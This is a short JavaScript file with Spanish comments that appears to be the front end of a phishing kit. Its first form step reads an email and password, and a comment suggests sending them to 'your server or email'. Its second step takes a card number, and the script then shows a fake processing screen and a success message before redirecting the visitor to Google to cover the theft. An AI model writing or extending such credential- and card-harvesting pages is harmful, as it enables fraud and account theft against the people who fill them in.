document.addEventListener('DOMContentLoaded', () => {
    
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const loader = document.getElementById('loader');
    const success = document.getElementById('success');

    // Paso 1: Email y Password
    step1.addEventListener('submit', (e) => {
        e.preventDefault();
        
        // Opcional: Capturar los datos para enviarlos a tu servidor o email
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        console.log("Datos capturados:", email, password);

        // Mostrar paso 2
        step1.classList.remove('active');
        step2.classList.add('active');
    });

    // Paso 2: Tarjeta
    step2.addEventListener('submit', (e) => {
        e.preventDefault();

        // Mostrar loader
        step2.classList.remove('active');
        loader.classList.add('active');

        // Simular 3 segundos de procesamiento
        setTimeout(() => {
            loader.classList.remove('active');
            success.classList.add('active');

            // Esperar 2 segundos más y redirigir a Google
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);

        }, 3000); // 3 segundos
    });

    // Formateo básico del número de tarjeta (espacios cada 4 dígitos)
    const cardInput = document.querySelector('input[placeholder="Card Number"]');
    if(cardInput) {
        cardInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formattedValue += ' ';
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });
    }
});